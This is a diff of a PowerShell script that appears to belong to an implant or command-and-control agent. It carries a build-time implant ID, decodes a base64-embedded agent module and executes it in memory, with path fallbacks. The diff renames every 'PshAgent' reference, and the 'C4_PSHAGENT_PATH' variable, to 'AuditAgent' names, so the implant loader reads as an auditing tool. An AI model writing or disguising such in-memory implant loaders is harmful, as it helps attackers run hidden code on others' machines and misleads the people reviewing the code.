@@ -23,18 +23,18 @@ $ErrorActionPreference = "Stop"
 # ── Implant ID (set at build time) ───────────────────────────────────────────
 $ImplantId = '__IMPLANT_ID__'
 
-# ── Import PshAgent Module ──────────────────────────────────────────────────
-$PshAgentB64 = '__PSHAGENT_B64__'
-if ($PshAgentB64 -ne '__PSHAGENT_B64__') {
+# ── Import AuditAgent Module ──────────────────────────────────────────────────
+$AuditAgentB64 = '__PSHAGENT_B64__'
+if ($AuditAgentB64 -ne '__PSHAGENT_B64__') {
     # In-memory: decode and load as dynamic module
-    $bytes = [Convert]::FromBase64String($PshAgentB64)
+    $bytes = [Convert]::FromBase64String($AuditAgentB64)
     $code = [Text.Encoding]::UTF8.GetString($bytes)
-    New-Module -Name "PshAgent" -ScriptBlock ([ScriptBlock]::Create($code)) | Import-Module
-} elseif ($env:C4_PSHAGENT_PATH -and (Test-Path $env:C4_PSHAGENT_PATH)) {
-    Import-Module $env:C4_PSHAGENT_PATH -Force
+    New-Module -Name "AuditAgent" -ScriptBlock ([ScriptBlock]::Create($code)) | Import-Module
+} elseif ($env:AUDIT_AGENT_PATH -and (Test-Path $env:AUDIT_AGENT_PATH)) {
+    Import-Module $env:AUDIT_AGENT_PATH -Force
 } else {
-    $p = Join-Path (Split-Path $PSScriptRoot -Parent) "PshAgent" "PshAgent.psd1"
-    if (-not (Test-Path $p)) { Write-Error "PshAgent module not found"; return }
+    $p = Join-Path (Split-Path $PSScriptRoot -Parent) "AuditAgent" "AuditAgent.psd1"
+    if (-not (Test-Path $p)) { Write-Error "AuditAgent module not found"; return }
     Import-Module $p -Force
 }
 
